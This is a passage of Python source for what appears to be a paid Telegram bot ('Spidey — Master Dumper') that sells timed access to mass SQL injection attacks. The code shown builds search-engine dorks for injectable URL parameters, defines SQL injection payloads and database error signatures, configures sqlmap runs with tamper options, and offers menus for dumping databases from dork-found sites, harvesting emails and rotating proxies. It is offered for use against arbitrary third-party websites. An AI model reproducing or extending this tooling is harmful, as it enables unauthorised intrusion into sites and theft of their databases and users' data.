logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

TOKEN = BOT_TOKEN  # hardcoded

# ── CONVERSATION STATES ───────────────────────────────────────────────────────
MENU               = 0
KW_WAIT_COUNT      = 1
KW_WAIT_SEEDS      = 2
DORK_WAIT_COUNT    = 3
DORK_WAIT_KEYWORDS = 4
PARSER_WAIT_DORKS  = 5
PURCHASE_MENU      = 6
REDEEM_WAIT_KEY    = 7
SQLI_WAIT_URLS     = 9
DUMP_WAIT_DORKS    = 10
URL_DUMP_WAIT      = 11
GDORK_DUMP_WAIT    = 13

# Pro Dork Generator sub-states (separate ConversationHandlers)
_ADORK_WAIT_KEYWORDS  = 20
_ADORK_WAIT_DOMAINS   = 21
_ADORK_WAIT_PARAMS    = 22
_ADORK_WAIT_FILETYPES = 23
_ADORK_WAIT_SF        = 24
_ADORK_WAIT_PF        = 25

# ── PRO DORK GENERATOR CONFIG ─────────────────────────────────────────────────
_ADORK_TEMPLATES: dict = {
    "t01": {"label": "(KW).(PF)?(PT)=",                       "template": "{KW}.{PF}?{PT}=",                   "vars": ["KW","PF","PT"]},
    "t02": {"label": "(KW).(PF)?(PT)= site:(DE)",             "template": "{KW}.{PF}?{PT}= site:{DE}",         "vars": ["KW","PF","PT","DE"]},
    "t03": {"label": "(KW).(PF)?(PT)=(NB)",                   "template": "{KW}.{PF}?{PT}={NB}",               "vars": ["KW","PF","PT","NB"]},
    "t04": {"label": "(KW).(PF)?(PT)=(NB) site:(DE)",         "template": "{KW}.{PF}?{PT}={NB} site:{DE}",     "vars": ["KW","PF","PT","NB","DE"]},
    "t05": {"label": '(SF)".(DE)" + "(KW)"',                  "template": '{SF}".{DE}" + "{KW}"',              "vars": ["SF","DE","KW"]},
    "t06": {"label": "(SF)(KW).(PF)?(PT)=",                   "template": "{SF}{KW}.{PF}?{PT}=",               "vars": ["SF","KW","PF","PT"]},
    "t07": {"label": "(SF)(KW).(PF)?(PT)= site:(DE)",         "template": "{SF}{KW}.{PF}?{PT}= site:{DE}",     "vars": ["SF","KW","PF","PT","DE"]},
    "t08": {"label": "(SF)(PT)=(KW).(PF)? site:(DE)",         "template": "{SF}{PT}={KW}.{PF}? site:{DE}",     "vars": ["SF","PT","KW","PF","DE"]},
    "t09": {"label": "(SF)(KW).(PF)?(PT)=(NB)",               "template": "{SF}{KW}.{PF}?{PT}={NB}",          "vars": ["SF","KW","PF","PT","NB"]},
    "t10": {"label": "(SF)(KW).(PF)?(PT)=(NB) site:(DE)",     "template": "{SF}{KW}.{PF}?{PT}={NB} site:{DE}","vars": ["SF","KW","PF","PT","NB","DE"]},
}

_ADORK_DEFAULT_DOMAINS   = [".com", ".net", ".org", ".ru", ".de", ".in", ".pk", ".us", ".uk", ".info"]
_ADORK_DEFAULT_PARAMS    = ["id", "user_id", "cat", "type", "page", "item", "product"]
_ADORK_DEFAULT_FILETYPES = [".php", ".asp", ".aspx", ".jsp"]
_ADORK_DEFAULT_SF        = ["inurl:", "intitle:", "allinurl:", "allintitle:"]
_ADORK_DEFAULT_PF        = ["index", "view", "page", "item", "product", "user", "login", "search", "show", "cat"]

# ── DATA DIRECTORY ─────────────────────────────────────────────────────────────
DATA_DIR   = os.path.join(os.path.dirname(__file__), "data")
PROXY_FILE = os.path.join(DATA_DIR, "proxies.json")
BAN_FILE   = os.path.join(DATA_DIR, "bans.json")
AUTH_FILE  = os.path.join(DATA_DIR, "auth.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
os.makedirs(DATA_DIR, exist_ok=True)


def _load_json(path: str, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path: str, obj) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2, default=str)
    except Exception:
        pass


def _save_proxies() -> None:
    """Persist proxy pool to disk (user + global)."""
    _save_json(PROXY_FILE, {
        "user": {str(uid): lst for uid, lst in user_proxies.items()},
        "global": global_proxy_pool,
    })


def _load_proxies() -> None:
    """Load proxy pool from disk."""
    global global_proxy_pool
    data = _load_json(PROXY_FILE, {})
    if isinstance(data, dict):
        for uid_str, lst in data.get("user", {}).items():
            try:
                user_proxies[int(uid_str)] = list(lst)
            except Exception:
                pass
        loaded = data.get("global", [])
        if isinstance(loaded, list):
            global_proxy_pool = loaded


def _save_bans() -> None:
    _save_json(BAN_FILE, list(banned_users))


def _load_bans() -> None:
    data = _load_json(BAN_FILE, [])
    if isinstance(data, list):
        banned_users.update(int(x) for x in data if str(x).isdigit())


def _save_auth() -> None:
    """Persist authorized_users and license_keys to disk."""
    serialized_auth = {
        str(uid): {
            "plan": info.get("plan", ""),
            "expires": info["expires"].isoformat() if isinstance(info.get("expires"), datetime) else str(info.get("expires", "")),
            "granted_by": info.get("granted_by", ""),
        }
        for uid, info in authorized_users.items()
    }
    serialized_keys = {
        key: {
            "plan": info.get("plan", ""),
            "expires_in": info.get("expires_in", ""),
            "used_by": info.get("used_by"),
            "created_at": info["created_at"].isoformat() if isinstance(info.get("created_at"), datetime) else str(info.get("created_at", "")),
        }
        for key, info in license_keys.items()
    }
    _save_json(AUTH_FILE, {"auth": serialized_auth, "keys": serialized_keys})


def _load_auth() -> None:
    """Load authorized_users and license_keys from disk."""
    data = _load_json(AUTH_FILE, {})
    if not isinstance(data, dict):
        return
    for uid_str, info in data.get("auth", {}).items():
        try:
            expires = datetime.fromisoformat(info["expires"])
            if expires > datetime.now():
                authorized_users[int(uid_str)] = {
                    "plan": info.get("plan", ""),
                    "expires": expires,
                    "granted_by": info.get("granted_by", ""),
                }
        except Exception:
            pass
    for key, info in data.get("keys", {}).items():
        try:
            license_keys[key] = {
                "plan": info.get("plan", ""),
                "expires_in": info.get("expires_in", ""),
                "used_by": info.get("used_by"),
                "created_at": datetime.fromisoformat(info["created_at"]) if info.get("created_at") else datetime.now(),
            }
        except Exception:
            pass


def _save_users() -> None:
    """Persist all_user_ids and trial_users to disk."""
    _save_json(USERS_FILE, {
        "all": list(all_user_ids),
        "trial": {str(uid): ts.isoformat() for uid, ts in trial_users.items()},
    })


def _load_users() -> None:
    """Load all_user_ids and trial_users from disk."""
    data = _load_json(USERS_FILE, {})
    if not isinstance(data, dict):
        return
    for uid in data.get("all", []):
        try:
            all_user_ids.add(int(uid))
        except Exception:
            pass
    for uid_str, ts_str in data.get("trial", {}).items():
        try:
            trial_users[int(uid_str)] = datetime.fromisoformat(ts_str)
        except Exception:
            pass


# ── GLOBAL STATE ──────────────────────────────────────────────────────────────
stop_events:      dict[int, asyncio.Event] = {}

# ══════════════════════════════════════════════════════════════════════
# ⚡ MEGA FEATURES — globals
# ══════════════════════════════════════════════════════════════════════
from pathlib import Path as _Path

_SCANNED_URLS: set          = set()
_SCANNED_FILE               = _Path(__file__).parent / "scanned_urls.json"
_CHECKPOINT_DIR             = _Path(__file__).parent / "checkpoints"
_CHECKPOINT_DIR.mkdir(exist_ok=True)
_LIVE_FEED: dict            = {}   # uid → {name, start, dorks_total, dorks_done, urls_found, phase}
_ANTHROPIC_KEY   = os.environ.get("ANTHROPIC_API_KEY", "")
_GEMINI_KEY      = os.environ.get("GEMINI_API_KEY", "")
_OPENROUTER_KEY  = os.environ.get("OPENROUTER_API_KEY", "")
_AI_KEYS_FILE    = _Path(__file__).parent / "ai_keys.json"

def _load_ai_keys():
    global _ANTHROPIC_KEY, _GEMINI_KEY, _OPENROUTER_KEY
    if _AI_KEYS_FILE.exists():
        try:
            d = json.loads(_AI_KEYS_FILE.read_text(encoding="utf-8"))
            if d.get("anthropic"):
                _ANTHROPIC_KEY = d["anthropic"]
                os.environ["ANTHROPIC_API_KEY"] = d["anthropic"]
            if d.get("gemini"):
                _GEMINI_KEY = d["gemini"]
                os.environ["GEMINI_API_KEY"] = d["gemini"]
            if d.get("openrouter"):
                _OPENROUTER_KEY = d["openrouter"]
                os.environ["OPENROUTER_API_KEY"] = d["openrouter"]
            logger.info("🔑 AI API Keys loaded from ai_keys.json")
        except Exception as e:
            logger.warning("Error loading ai_keys.json: %s", e)

def _save_ai_key(provider: str, key: str):
    global _ANTHROPIC_KEY, _GEMINI_KEY, _OPENROUTER_KEY
    d = {}
    if _AI_KEYS_FILE.exists():
        try:
            d = json.loads(_AI_KEYS_FILE.read_text(encoding="utf-8"))
        except Exception:
            d = {}
    d[provider] = key
    _AI_KEYS_FILE.write_text(json.dumps(d, indent=2), encoding="utf-8")
    if provider == "anthropic":
        _ANTHROPIC_KEY = key
        os.environ["ANTHROPIC_API_KEY"] = key
    elif provider == "gemini":
        _GEMINI_KEY = key
        os.environ["GEMINI_API_KEY"] = key
    elif provider == "openrouter":
        _OPENROUTER_KEY = key
        os.environ["OPENROUTER_API_KEY"] = key

def _mask_key(k: str) -> str:
    if not k:
        return "❌ `Not Set`"
    if len(k) <= 8:
        return "✅ `Configured (****)`"
    return f"✅ `{k[:6]}...{k[-4:]}`"

def _ai_keys_status_text() -> str:
    return (
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "🤖 𝘼𝙄 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧 𝙆𝙚𝙮𝙨 𝘾𝙤𝙣𝙛𝙞𝙜\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🔵 *Anthropic (Claude):*\n   {_mask_key(_ANTHROPIC_KEY)}\n\n"
        f"🟢 *Google Gemini:*\n   {_mask_key(_GEMINI_KEY)}\n\n"
        f"🟡 *OpenRouter (LLaMA/DeepSeek/GPT):*\n   {_mask_key(_OPENROUTER_KEY)}\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 *How to configure:*\n"
        "• Tap any button below to set or clear keys\n"
        "• Or send command directly in chat:\n"
        "`/setkey gemini YOUR_KEY`\n"
        "`/setkey anthropic YOUR_KEY`\n"
        "`/setkey openrouter YOUR_KEY`"
    )

def make_ai_keys_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔵 Sᴇᴛ Aɴᴛʜʀᴏᴘɪᴄ",  callback_data="setkey_anthropic"),
         InlineKeyboardButton("🟢 Sᴇᴛ Gᴇᴍɪɴɪ",     callback_data="setkey_gemini")],
        [InlineKeyboardButton("🟡 Sᴇᴛ OᴘᴇɴRᴏᴜᴛᴇʀ", callback_data="setkey_openrouter"),
         InlineKeyboardButton("🗑️ Cʟᴇᴀʀ Aʟʟ",      callback_data="delkey_all")],
        [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ",     callback_data="admin_panel")],
    ])

# Email regex — all providers
_EMAIL_RE = re.compile(
    r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,10}",
    re.IGNORECASE,
)

def _load_scanned():
    global _SCANNED_URLS
    if _SCANNED_FILE.exists():
        try:
            _SCANNED_URLS = set(json.loads(_SCANNED_FILE.read_text()))
            logger.info("📂 Loaded %d scanned URLs", len(_SCANNED_URLS))
        except Exception:
            pass

def _save_scanned():
    try:
        lst = list(_SCANNED_URLS)
        # cap at 1M entries so file doesnt grow forever
        if len(lst) > 1_000_000:
            lst = lst[-1_000_000:]
            _SCANNED_URLS.clear()
            _SCANNED_URLS.update(lst)
        _SCANNED_FILE.write_text(json.dumps(lst))
    except Exception:
        pass

def _save_checkpoint(uid: int, dorks: list, done: int, found: list):
    try:
        f = _CHECKPOINT_DIR / f"{uid}.json"
        f.write_text(json.dumps({"dorks": dorks, "done": done, "found": found}))
    except Exception:
        pass

def _load_checkpoint(uid: int) -> dict | None:
    f = _CHECKPOINT_DIR / f"{uid}.json"
    if f.exists():
        try:
            return json.loads(f.read_text())
        except Exception:
            pass
    return None

def _clear_checkpoint(uid: int):
    try:
        f = _CHECKPOINT_DIR / f"{uid}.json"
        if f.exists():
            f.unlink()
    except Exception:
        pass

def _extract_emails(text: str) -> list:
    found = _EMAIL_RE.findall(text)
    return list(dict.fromkeys(e.lower() for e in found))

def _live_update(uid: int, **kwargs):
    if uid in _LIVE_FEED:
        _LIVE_FEED[uid].update(kwargs)

license_keys:     dict[str, dict]          = {}
authorized_users: dict[int, dict]          = {}
all_user_ids:     set                      = set()
user_proxies:     dict[int, list]          = {}   # uid ➪ [proxy_url, ...]
global_proxy_pool: list                    = []   # admin-set pool shared by all users
banned_users:     set                      = set()  # set of banned user IDs
trial_users:      dict[int, datetime]      = {}   # uid ➪ first-seen timestamp (5-min trial)

# ── Per-user sqlmap configuration ─────────────────────────────────────────────
_DEFAULT_SQLOPTS = {
    "level":     DEFAULT_LEVEL,
    "risk":      DEFAULT_RISK,
    "technique": DEFAULT_TECHNIQUE,
    "tamper":    DEFAULT_TAMPER,
    "threads":   10,
    "crawl":     0,
    "engine":    "api",      # "api" (REST server) | "subprocess" (legacy)
    "bulk":      False,      # True = --bulk-file mode (one sqlmap, all URLs)
}
user_sqlopts: dict[int, dict] = {}   # uid ➪ copy of _DEFAULT_SQLOPTS

# Active sqlmap API taskids per user (for cancel support)
active_api_tasks: dict[int, list] = {}   # uid ➪ [taskid, ...]

# ── PLANS ─────────────────────────────────────────────────────────────────────
PLANS = [
    ("30 Mɪɴᴜᴛᴇs","30ᴍ", "☁️",  timedelta(minutes=30)),
    ("1 Hᴏᴜʀ",   "1ʜ",  "🌥️︎",  timedelta(hours=1)),
    ("6 Hᴏᴜʀs",  "6ʜ",  "⛅︎",  timedelta(hours=6)),
    ("1 Dᴀʏ",    "1ᴅ",  "🌩️︎",  timedelta(days=1)),
    ("3 Dᴀʏs",   "3ᴅ",  "⛈️︎",  timedelta(days=3)),
    ("5 Dᴀʏs",   "5ᴅ",  "🌤️︎",  timedelta(days=5)),
    ("10 Dᴀʏs",  "10ᴅ", "🌒︎",  timedelta(days=10)),
    ("15 Dᴀʏs",  "15ᴅ", "🌓︎",  timedelta(days=15)),
    ("20 Dᴀʏs",  "20ᴅ", "🌔",  timedelta(days=20)),
    ("30 Dᴀʏs",  "30ᴅ", "🌕︎",  timedelta(days=30)),
]
PLAN_MAP = {code: (label, emoji, delta) for label, code, emoji, delta in PLANS}

# ── PLAN PRICES (shown in purchase menu & trial expired message) ───────────────
PLAN_PRICES = {
    "30ᴍ": "$2",
    "1ʜ":  "$3",
    "6ʜ":  "$5",
    "1ᴅ":  "$8",
    "3ᴅ":  "$16",
    "5ᴅ":  "$20",
    "10ᴅ": "$28",
    "15ᴅ": "$35",
    "20ᴅ": "$42",
    "30ᴅ": "$50",
}

# ── SQL INJECTION PAYLOADS ────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'", '"', "')", '")', "' OR '1'='1' --", '" OR "1"="1" --',
    "' OR 1=1 --", "') OR ('1'='1", "1' AND 1=2 --", "1 AND 1=2",
]
SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "sqlstate", "ora-",
    "pg::syntaxerror", "sqlite3::exception", "sqlite_error",
    "microsoft ole db provider for sql server",
    "odbc sql server driver", "syntax error or access violation",
    "division by zero", "supplied argument is not a valid mysql",
    "mysql_fetch_array() expects parameter",
    "mysql_num_rows() expects parameter",
    "mysql_result() expects parameter",
    "mysql_query() expects parameter",
    "pg_query(): query failed", "unterminated string literal",
    "syntax error at or near", "invalid input syntax",
    "com.mysql.jdbc", "org.postgresql", "java.sql.sqlexception",
    "microsoft access driver", "jet database engine",
    "native client", "sql syntax", "mysql server",
    "database error", "db error", "mysql error", "sql error",
]

# ── SPINNERS ──────────────────────────────────────────────────────────────────
KW_SPINNER_FRAMES = [
    "🧤 *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓░░░░░░░░░░░░░░░░░░░]`",
    "🧤︎ *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓░░░░░░░░░░░░░░░░░]`",
    "🧤︎ *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓░░░░░░░░░░░░░░]`",
    "🧤 *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓▓▓▓░░░░░░░░░░░]`",
    "🧤︎ *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░]`",
    "🧤 *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░]`",
    "🧤︎ *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░]`",
    "🧤︎ *Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]`",
]
DORK_SPINNER_FRAMES = [
    "🥷🏻 *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ○ ○ ○ ○ ○ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ○ ○ ○ ○ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ○ ○ ○ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ◉ ○ ○ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ◉ ◉ ○ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ◉ ◉ ◉ ○ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ◉ ◉ ◉ ◉ ○`",
    "🥷🏻︎ *Bᴜɪʟᴅɪɴɢ Dᴏʀᴋ Aʀsᴇɴᴀʟ...*\n`◉ ◉ ◉ ◉ ◉ ◉ ◉ ◉`",
]
PARSER_SPINNER_FRAMES = [
    "🔬 *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌑 🌑 🌑 🌑 🌑 🌑`",
    "🔬 *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌑 🌑 🌑 🌑 🌑`",
    "🔬 *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌓 🌑 🌑 🌑 🌑`",
    "🔬︎ *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌓 🌔 🌑 🌑 🌑`",
    "🔬 *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌓 🌔 🌕 🌑 🌑`",
    "🔬 *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌓 🌔 🌕 🌖 🌑`",
    "🔬︎ *Sᴄᴀɴɴɪɴɢ ᴛʜᴇ ᴡᴇʙ...*\n`🌑 🌒 🌓 🌔 🌕 🌖 🌗`",
]
BOOT_BANNERS = [
    "```\n✯ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙇𝙤𝙫𝙚𝙙 𝙗𝙮 𝙣𝙤𝙣𝙚..! ✯\n```",
    "```\n𖣔 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙂𝙤𝙙'𝙎 𝘿𝙚𝙫𝙤𝙩𝙚𝙚..! 𖣔\n```",
    "```\n𑁍 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙈𝙖𝙨𝙩𝙚𝙧 𝘿𝙪𝙢𝙥𝙚𝙧..! 𑁍\n```",
    "```\n❁ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙐𝙡𝙩𝙞𝙢𝙖𝙩𝙚 𝙬𝙖𝙧𝙧𝙞𝙤𝙧..! ❁\n```",
    "```\n❀ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙒𝙞𝙩𝙝 𝙔𝙤𝙪𝙝 𝙁𝙤𝙧 𝙔𝙤𝙪𝙝..! ❀\n```",
]


# ── PRO DORK GENERATOR HELPERS ────────────────────────────────────────────────

def adork_get_cfg(context) -> dict:
    if "adork_config" not in context.user_data:
        context.user_data["adork_config"] = {
            "keywords":  [],
            "domains":   _ADORK_DEFAULT_DOMAINS.copy(),
            "params":    _ADORK_DEFAULT_PARAMS.copy(),
            "filetypes": _ADORK_DEFAULT_FILETYPES.copy(),
            "sf":        _ADORK_DEFAULT_SF.copy(),
            "pf":        _ADORK_DEFAULT_PF.copy(),
            "enabled":   list(_ADORK_TEMPLATES.keys()),
        }
    return context.user_data["adork_config"]


def _adork_parse_text(text: str) -> List[str]:
    sep = "," if "," in text else "\n"
    return [item.strip() for item in text.split(sep) if item.strip()]


def adork_generate_all(cfg: dict) -> List[str]:
    var_map = {
        "KW": cfg.get("keywords",  []),
        "DE": cfg.get("domains",   []),
        "NB": cfg.get("params",    []),
        "PT": cfg.get("filetypes", []),
        "SF": cfg.get("sf",        []),
        "PF": cfg.get("pf",        []),
    }
    enabled = set(cfg.get("enabled", []))
    seen: Set[str] = set()
    dorks: List[str] = []
    for tid, tinfo in _ADORK_TEMPLATES.items():
        if tid not in enabled:
            continue
        tmpl   = tinfo["template"]
        needed = tinfo["vars"]
        lists  = [var_map.get(v, [""]) or [""] for v in needed]
        for combo in itertools.product(*lists):
            subs = dict(zip(needed, combo))
            dork = tmpl.format(**subs)
            if dork not in seen:
                seen.add(dork)
                dorks.append(dork)
    return dorks


async def adork_generate_n(cfg: dict, keywords: List[str], amount: int) -> List[str]:
    var_map = {
        "KW": keywords or ["target"],
        "DE": cfg.get("domains",   []) or [".com"],
        "NB": cfg.get("params",    []) or ["id"],
        "PT": cfg.get("filetypes", []) or [".php"],
        "SF": cfg.get("sf",        []) or ["inurl:"],
        "PF": cfg.get("pf",        []) or ["index"],
    }
    enabled_tmpls = [
        _ADORK_TEMPLATES[t]
        for t in cfg.get("enabled", list(_ADORK_TEMPLATES.keys()))
        if t in _ADORK_TEMPLATES
    ] or list(_ADORK_TEMPLATES.values())

    seen: Set[str] = set()
    result: List[str] = []
    max_attempts = amount * 10
    attempts = 0
    while len(result) < amount and attempts < max_attempts:
        n = min(50_000, amount - len(result) + 1000)
        for _ in range(n):
            tinfo  = random.choice(enabled_tmpls)
            needed = tinfo["vars"]
            subs   = {v: random.choice(var_map[v]) for v in needed}
            dork   = tinfo["template"].format(**subs)
            if dork not in seen:
                seen.add(dork)
                result.append(dork)
                if len(result) >= amount:
                    break
        attempts += n
        await asyncio.sleep(0)
    return result[:amount]


def _adork_template_keyboard(enabled: set) -> InlineKeyboardMarkup:
    rows = []
    for tid, tinfo in _ADORK_TEMPLATES.items():
        icon = "✅" if tid in enabled else "☑️"
        rows.append([InlineKeyboardButton(f"{icon} {tinfo['label']}", callback_data=f"adork_tgl_{tid}")])
    rows.append([
        InlineKeyboardButton("✅ ᴀʟʟ ᴏɴ",  callback_data="adork_all_on"),
        InlineKeyboardButton("☑️ ᴀʟʟ ᴏғғ", callback_data="adork_all_off"),
    ])
    rows.append([InlineKeyboardButton("💾 sᴀᴠᴇ & ᴄʟᴏsᴇ", callback_data="adork_cfg_done")])
    return InlineKeyboardMarkup(rows)


# ── HELPERS ───────────────────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def trial_status(user_id: int) -> str:
    """Returns 'active', 'expired', or 'none' for trial state."""
    if user_id in trial_users:
        elapsed = (datetime.now() - trial_users[user_id]).total_seconds()
        if elapsed < TRIAL_MINUTES * 60:
            return "active"
        return "expired"
    return "none"


def has_access(user_id: int) -> bool:
    if user_id in banned_users:
        return False
    if is_admin(user_id):
        return True
    if user_id in authorized_users:
        if datetime.now() < authorized_users[user_id]["expires"]:
            return True
        else:
            del authorized_users[user_id]
    if trial_status(user_id) == "active":
        return True
    return False


def effective_proxy_pool(uid: int) -> list:
    """Return user's personal proxy pool, falling back to global pool if empty."""
    personal = user_proxies.get(uid, [])
    return personal if personal else global_proxy_pool


def generate_key() -> str:
    parts = ["".join(random.choices(string.ascii_uppercase + string.digits, k=5)) for _ in range(4)]
    return "-".join(parts)


def make_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥇 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏᴡᴏʀᴅs︎",        callback_data="menu_keywords"),
         InlineKeyboardButton("🥈 Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs",           callback_data="menu_dorks")],
        [InlineKeyboardButton("🎖️ Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs ᴠ2",       callback_data="menu_adorks"),
         InlineKeyboardButton("🥉 Dᴇᴇᴘ Uʀʟ Pᴀʀsᴇʀ",          callback_data="menu_parser")],
        [InlineKeyboardButton("🪷 Hǫ Sǫʟɪ ᴅᴏʀᴋs",            callback_data="menu_hqdorks"),
         InlineKeyboardButton("🌍 Cᴏᴜɴᴛʀʏ Dᴏʀᴋs",            callback_data="menu_countrydorks")],
        [InlineKeyboardButton("🦨 Cᴍs Dᴏʀᴋs",                callback_data="menu_cmsdorks"),
         InlineKeyboardButton("🌫️ Exᴘᴏsᴇᴅ Fɪʟᴇ Dᴏʀᴋs",       callback_data="menu_exposeddorks")],
        [InlineKeyboardButton("🦠 Sǫʟɪ Sᴄᴀɴɴᴇʀ",             callback_data="menu_sqli")],
        [InlineKeyboardButton("🪵 Dᴏʀᴋs ➪ Dʙ Dᴜᴍᴘ",           callback_data="menu_dump"),
         InlineKeyboardButton("🎢 Uʀʟs ➪ Dʙ Dᴜᴍᴘ",           callback_data="menu_urldump")],
        [InlineKeyboardButton("🔑 Rᴇᴅᴇᴇᴍ Kᴇʏ",               callback_data="menu_redeem"),
         InlineKeyboardButton("🍷 Pᴜʀᴄʜᴀsᴇ Pʀᴇᴍᴜɪᴍ",         callback_data="menu_purchase")],
        [InlineKeyboardButton("🚸︎ Hᴏᴡ Tᴏ ᴜsᴇ ?",               callback_data="menu_guide"),
         InlineKeyboardButton("🧛🏻 Cᴏɴᴛᴀᴄᴛ Oᴡɴᴇʀ",           callback_data="menu_help")],
        [InlineKeyboardButton("📧 Eᴍᴀɪʟ Hᴀʀᴠᴇsᴛ",            callback_data="menu_emails"),
         InlineKeyboardButton("⚡ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ",           callback_data="menu_statuscheck")],
        [InlineKeyboardButton("🤖 AI Kᴇʏᴡᴏʀᴅs",             callback_data="menu_aigen"),
         InlineKeyboardButton("🔁 Dᴇᴅᴜᴘ Sᴛᴀᴛᴜs",            callback_data="menu_dedup")],
        [InlineKeyboardButton("⚜️ Bᴜʏ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ",          callback_data="menu_source")],
    ])


def make_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑︎ Gᴇɴᴇʀᴀᴛᴇ Kᴇʏ",    callback_data="admin_genkey"),
         InlineKeyboardButton("📝︎ Lɪsᴛ Kᴇʏs",       callback_data="admin_listkeys")],
        [InlineKeyboardButton("♻️ Rᴇᴠᴏᴋᴇ Kᴇʏ",      callback_data="admin_revokekey"),
         InlineKeyboardButton("➕ Aᴅᴅ Usᴇʀ",         callback_data="admin_adduser")],
        [InlineKeyboardButton("📛︎ Aᴄᴛɪᴠᴇ Usᴇʀs",    callback_data="admin_users"),
         InlineKeyboardButton("📊︎ Bᴏᴛ Sᴛᴀᴛs",       callback_data="admin_stats")],
        [InlineKeyboardButton("📣 Bʀᴏᴀᴅᴄᴀsᴛ",       callback_data="admin_broadcast"),
         InlineKeyboardButton("🗒️ Bᴀɴ Lɪsᴛ",        callback_data="admin_banlist")],
        [InlineKeyboardButton("⛔︎ Bᴀɴ Usᴇʀ",        callback_data="admin_banuser"),
         InlineKeyboardButton("↪️ Uɴʙᴀɴ Usᴇʀ",      callback_data="admin_unbanuser")],
        [InlineKeyboardButton("🔄︎ Fʟᴜsʜ Aʟʟ Bᴀɴs",  callback_data="admin_flushbans"),
         InlineKeyboardButton("📤 Exᴘᴏʀᴛ Usᴇʀs",    callback_data="admin_exportusers")],
        [InlineKeyboardButton("🌊 Pʀᴏxʏ Pᴏᴏʟ",  callback_data="admin_gproxylist"),
         InlineKeyboardButton("🌬️︎ Cʟᴇᴀʀ Pʀᴏxɪᴇs",   callback_data="admin_clearproxies")],
        [InlineKeyboardButton("︎🥷🏻 Cʜᴇᴄᴋ Pʀᴏxɪᴇs",   callback_data="admin_checkproxies"),
         InlineKeyboardButton("🛖︎ Sᴇʀᴠᴇʀ Iɴғᴏ",     callback_data="admin_serverinfo")],
        [InlineKeyboardButton("🔄 Sᴄʀᴀᴘᴇ & Vᴀʟɪᴅᴀᴛᴇ", callback_data="admin_scrapeproxy")],
        [InlineKeyboardButton("👁️ Lɪᴠᴇ Fᴇᴇᴅ",           callback_data="admin_livefeed"),
